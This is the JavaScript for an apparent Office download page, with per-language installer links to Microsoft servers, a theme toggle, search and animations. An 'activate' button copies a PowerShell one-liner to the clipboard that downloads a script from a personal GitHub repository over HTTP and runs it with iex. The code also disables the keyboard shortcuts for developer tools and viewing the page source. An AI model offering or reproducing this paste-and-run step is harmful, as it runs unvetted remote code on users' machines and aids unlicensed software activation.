const themeToggleBtn = document.getElementById('themeToggle');
const themeIcon = themeToggleBtn.querySelector('i');

const setTheme = (isDark) => {
    document.documentElement.setAttribute('data-theme', isDark ? 'dark' : 'light');
    themeIcon.className = isDark ? 'fas fa-sun' : 'fas fa-moon';
    localStorage.setItem('theme', isDark ? 'dark' : 'light');
};

const initTheme = () => {
    const savedTheme = localStorage.getItem('theme');
    if (savedTheme) {
        setTheme(savedTheme === 'dark');
    } else {
        const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
        setTheme(systemPrefersDark);
    }
};

themeToggleBtn.addEventListener('click', () => {
    const isDark = document.documentElement.getAttribute('data-theme') === 'dark';
    themeIcon.style.transform = 'rotate(360deg) scale(0)';
    setTimeout(() => {
        setTheme(!isDark);
        themeIcon.style.transform = 'rotate(0deg) scale(1)';
    }, 200);
});

window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
    if (!localStorage.getItem('theme')) setTheme(e.matches);
});

initTheme();

const languages = [
    ["อังกฤษ [en-US]", "en-us"], ["อาหรับ [ar-SA]", "ar-sa"], ["บัลแกเรีย [bg-BG]", "bg-bg"],
    ["เช็ก [cs-CZ]", "cs-cz"], ["เดนมาร์ก [da-DK]", "da-dk"], ["เยอรมัน [de-DE]", "de-de"],
    ["กรีก [el-GR]", "el-gr"], ["อังกฤษ [en-GB]", "en-gb"], ["สเปน [es-ES]", "es-es"],
    ["สเปน เม็กซิโก [es-MX]", "es-mx"], ["เอสโตเนีย [et-EE]", "et-ee"], ["ฟินแลนด์ [fi-FI]", "fi-fi"],
    ["ฝรั่งเศส แคนาดา [fr-CA]", "fr-ca"], ["ฝรั่งเศส [fr-FR]", "fr-fr"], ["ฮีบรู [he-IL]", "he-il"],
    ["ภาษาฮินดี [hi-IN]", "hi-in"], ["โครเอเชีย [hr-HR]", "hr-hr"], ["ฮังการี [hu-HU]", "hu-hu"],
    ["อินโดนีเซีย [id-ID]", "id-id"], ["อิตาลี [it-IT]", "it-it"], ["ภาษาญี่ปุ่น [ja-JP]", "ja-jp"],
    ["คาซัคสถาน [kk-KZ]", "kk-kz"], ["เกาหลี [ko-KR]", "ko-kr"], ["ลิทัวเนีย [lt-LT]", "lt-lt"],
    ["ลัตเวีย [lv-LV]", "lv-lv"], ["มาเลย์ (ละติน) [ms-MY]", "ms-my"], ["นอร์เวย์ Bokmål [nb-NO]", "nb-no"],
    ["ดัตช์ [nl-NL]", "nl-nl"], ["โปแลนด์ [pl-PL]", "pl-pl"], ["โปรตุเกส (บราซิล) [pt-BR]", "pt-br"],
    ["โปรตุเกส (โปรตุเกส) [pt-PT]", "pt-pt"], ["โรมาเนีย [ro-RO]", "ro-ro"], ["รัสเซีย [ru-RU]", "ru-ru"],
    ["สโลวัก [sk-SK]", "sk-sk"], ["สโลวีเนีย [sl-SI]", "sl-si"], ["เซอร์เบีย (ละติน) เก่า [sr-latn-cs]", "sr-latn-cs"],
    ["เซอร์เบีย (ละติน) [sr-latn-RS]", "sr-latn-rs"], ["สวีเดน [sv-SE]", "sv-se"], ["ภาษาไทย [th-TH]", "th-th"],
    ["ตุรกี [tr-TR]", "tr-tr"], ["ยูเครน [uk-UA]", "uk-ua"], ["เวียดนาม [vi-VN]", "vi-vn"],
    ["จีน (ตัวย่อ) [zh-CN]", "zh-cn"], ["จีน (ตัวเต็ม) [zh-TW]", "zh-tw"]
];

const tableBody = document.getElementById('tableBody');

languages.forEach((lang, index) => {
    const row = document.createElement('tr');
    row.style.animationDelay = `${index * 0.015}s`;
    
    const name = lang[0].split(' [')[0];
    const code = lang[0].split(' [')[1].replace(']', '');
    const langCode = lang[1];
    
    row.innerHTML = `
        <td>
            <div class="lang-wrapper">
                <span class="lang-name">${name}</span>
                <span class="lang-badge">${code}</span>
            </div>
        </td>
        <td><a href="https://c2rsetup.officeapps.live.com/c2r/download.aspx?ProductreleaseID=O365ProPlusRetail&platform=x64&language=${langCode}&version=O16GA" class="download-btn online"><i class="fas fa-download"></i> x64</a></td>
        <td><a href="https://c2rsetup.officeapps.live.com/c2r/download.aspx?ProductreleaseID=O365ProPlusRetail&platform=x86&language=${langCode}&version=O16GA" class="download-btn online"><i class="fas fa-download"></i> x86</a></td>
        <td><a href="https://officecdn.microsoft.com/db/492350f6-3a01-4f97-b9c0-c7c6ddf67d60/media/${langCode}/O365ProPlusRetail.img" class="download-btn offline"><i class="fas fa-file-archive"></i> IMG</a></td>
    `;
    tableBody.appendChild(row);
});

let toastTimeout;
document.getElementById('activateM365').addEventListener('click', () => {
    const cmd = "irm http://raw.githubusercontent.com/phwyverysad/-/refs/heads/main/powershell/activate_365.ps1 | iex";
    navigator.clipboard.writeText(cmd).then(() => {
        const toast = document.getElementById('copyToast');
        clearTimeout(toastTimeout);
        toast.classList.remove('show');
        setTimeout(() => {
            toast.classList.add('show');
            toastTimeout = setTimeout(() => toast.classList.remove('show'), 3000);
        }, 100);
    });
});

document.getElementById('searchInput').addEventListener('input', function() {
    const val = this.value.toUpperCase();
    const rows = tableBody.getElementsByTagName('tr');
    let delayCounter = 0;
    for (let row of rows) {
        if (row.innerText.toUpperCase().includes(val)) {
            row.style.display = '';
            row.style.animation = 'none';
            void row.offsetWidth;
            row.style.animation = 'tableRowFade 0.4s forwards';
            row.style.animationDelay = `${delayCounter * 0.015}s`;
            delayCounter++;
        } else {
            row.style.display = 'none';
        }
    }
});

document.addEventListener('keydown', function(e) {
    if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I") || (e.ctrlKey && e.key === "U")) {
        e.preventDefault(); return false;
    }
});

const createParticles = () => {
    const container = document.getElementById('particles-container');
    for (let i = 0; i < 20; i++) {
        const particle = document.createElement('div');
        particle.classList.add('particle');
        const size = Math.random() * 60 + 20;
        particle.style.width = `${size}px`; particle.style.height = `${size}px`;
        particle.style.left = `${Math.random() * 100}vw`;
        particle.style.animationDuration = `${Math.random() * 20 + 15}s`;
        particle.style.animationDelay = `${Math.random() * 10}s`;
        container.appendChild(particle);
    }
};
createParticles();

const screen = document.getElementById("screen");
const xmlns = "http://www.w3.org/2000/svg";
const xlinkns = "http://www.w3.org/1999/xlink";
let width, height;

const pointer = { x: window.innerWidth / 2, y: window.innerHeight / 2 };

window.addEventListener(
	"pointermove",
	(e) => {
		pointer.x = e.clientX;
		pointer.y = e.clientY;
		rad = 0;
	},
	false
);

const resize = () => {
	width = window.innerWidth;
	height = window.innerHeight;
};

window.addEventListener("resize", () => resize(), false);
resize();

const prepend = (use, i) => {
	const elem = document.createElementNS(xmlns, "use");
	elems[i].use = elem;
	elem.setAttributeNS(xlinkns, "xlink:href", "#" + use);
	screen.prepend(elem);
};
	
const N = 40;
const elems = [];
for (let i = 0; i < N; i++) elems[i] = { use: null, x: width / 2, y: 0 };

const radm = Math.min(pointer.x, pointer.y) - 20;
let frm = Math.random();
let rad = 0;

for (let i = 1; i < N; i++) {
	if (i === 1) prepend("Cabeza", i);
	else if (i === 8 || i === 14) prepend("Aletas", i);
	else prepend("Espina", i);
}

const run = () => {
	requestAnimationFrame(run);
	let e = elems[0];
	const ax = Math.cos(3 * frm) * rad * width / height;
	const ay = Math.sin(4 * frm) * rad * height / width;
	
    e.x += (ax + pointer.x - e.x) / 10;
	e.y += (ay + pointer.y - e.y) / 10;
	
    for (let i = 1; i < N; i++) {
		let e = elems[i];
		let ep = elems[i - 1];
		const a = Math.atan2(e.y - ep.y, e.x - ep.x);
		e.x += (ep.x - e.x + (Math.cos(a) * (100 - i)) / 5) / 4;
		e.y += (ep.y - e.y + (Math.sin(a) * (100 - i)) / 5) / 4;
		const s = (162 + 4 * (1 - i)) / 50;
		e.use.setAttributeNS(
			null,
			"transform",
			`translate(${(ep.x + e.x) / 2},${(ep.y + e.y) / 2}) rotate(${
				(180 / Math.PI) * a
			}) translate(${0},${0}) scale(${s},${s})`
		);
	}
	
    if (rad < radm) rad++;
	frm += 0.003;
	
    if (rad > 60) {
		pointer.x += (width / 2 - pointer.x) * 0.05;
		pointer.y += (height / 2 - pointer.y) * 0.05;
	}
};

run();